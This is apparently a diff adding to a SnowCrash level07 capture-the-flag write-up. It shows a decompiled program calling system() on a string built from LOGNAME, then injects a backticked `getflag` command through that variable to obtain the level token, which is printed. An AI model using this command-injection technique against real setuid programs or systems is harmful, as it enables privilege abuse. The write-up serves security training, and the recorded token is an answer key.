@@ -16,3 +16,14 @@ int32_t main(int32_t argc, char** argv, char** envp)
 	return system(var_1c);
 }
 ```
+
+We can use `LOGNAME` to print whatever value we want. We can ask it to gently give us the return value of `getflag` such as:
+```bash
+level07@SnowCrash:~$ LOGNAME="\`getflag\`"
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+```
+
+## Token
+
+fiumuikeil55xe9cu4dood66h
